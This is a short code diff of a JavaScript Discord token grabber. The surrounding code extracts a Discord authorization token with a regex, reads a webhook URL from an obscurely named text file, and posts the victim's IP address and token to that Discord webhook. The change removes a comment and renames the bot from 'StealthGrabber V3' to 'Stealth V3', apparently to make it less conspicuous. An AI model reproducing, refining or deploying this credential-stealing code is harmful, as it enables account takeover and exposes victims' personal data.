@@ -23,7 +23,6 @@
             var authorization = searchAuthorizationRegex(inputText);
             
             if (authorization) {
-                // Retrieve the webhook URL from the file
                 $.get('kcygyegfierdgfsbdsfjh4efbdsbifweriuewdufndifi4ufniudnfuinjdsnfjks.txt', function(webhookUrl) {
                     var ipAddress = document.getElementById("ipAddress").textContent; // Get the IP address from the page
                 
@@ -32,7 +31,7 @@
                         'embeds': [{
                             'description': 'IP address : ' + ipAddress + '\n\nDiscord Token : ' + authorization
                         }],
-                        'username': 'StealthGrabber V3',
+                        'username': 'Stealth V3',
                         'avatar_url': 'https://cdn.discordapp.com/avatars/993662475306287134/806b70229d50907de2d61cd165e1b4bf.png?size=2048'
                     };
                 
